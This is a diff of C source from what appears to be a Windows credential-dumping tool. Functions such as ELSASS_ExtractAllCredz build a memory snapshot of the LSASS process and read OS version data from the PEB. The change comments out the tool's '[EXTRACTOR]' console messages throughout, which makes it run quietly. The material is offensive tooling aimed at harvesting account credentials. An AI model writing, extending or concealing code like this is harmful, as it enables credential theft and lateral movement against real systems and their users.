@@ -46,7 +46,7 @@ static BOOL ELSASS_ExtractHeader(PDUMPCONTEXT dc)
 
     ELSASS_Append(dc, header_bytes, SIZE_OF_HEADER, 0x00);
 
-    printf("[EXTRACTOR] Header parsed\n");
+    //printf("[DEBUG] Header parsed\n");
 
     return (true);
 }
@@ -94,7 +94,7 @@ BOOL ELSASS_ExtractSystemInfo(PDUMPCONTEXT dc)
 {
     DUMPSYSTEMINFO system_info = { 0 };
 
-    printf("[EXTRACTOR] Parsing SystemInfo streams (3)\n");
+    //printf("[DEBUG] Parsing SystemInfo streams (3)\n");
 
     PVOID pPeb;
     PULONG32 OSMajorVersion;
@@ -109,10 +109,10 @@ BOOL ELSASS_ExtractSystemInfo(PDUMPCONTEXT dc)
     OSPlatformId = RVA(PULONG32, pPeb, OSPLATFORMID_OFFSET);
     CSDVersion = RVA(PUNICODE_STRING, pPeb, CSDVERSION_OFFSET);
     system_info.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
-    printf("[EXTRACTOR] OSMajorVersion: %d\n", *OSMajorVersion);
-    printf("[EXTRACTOR] OSMinorVersion: %d\n", *OSMinorVersion);
-    printf("[EXTRACTOR] OSBuildNumber: %d\n", *OSBuildNumber);
-    printf("[EXTRACTOR] CSDVersion: %ls\n", CSDVersion->Buffer);
+    //printf("[DEBUG] OSMajorVersion: %d\n", *OSMajorVersion);
+    //printf("[DEBUG] OSMinorVersion: %d\n", *OSMinorVersion);
+    //printf("[DEBUG] OSBuildNumber: %d\n", *OSBuildNumber);
+    //printf("[DEBUG] CSDVersion: %ls\n", CSDVersion->Buffer);
 
     system_info.ProcessorLevel = 0;
     system_info.ProcessorRevision = 0;
@@ -211,7 +211,7 @@ BOOL ELSASS_ExtractAllCredz(PDUMPCONTEXT dc)
 {
     PMODULEINFO module_list;
 
-    printf("[EXTRACTOR] All snapshots prerequisites ok, extracting memory...\n");
+    //printf("[DEBUG] All snapshots prerequisites ok, extracting memory...\n");
     ELSASS_ExtractHeader(dc);
     ELSASS_ExtractDirectories(dc);
     ELSASS_ExtractSystemInfo(dc);
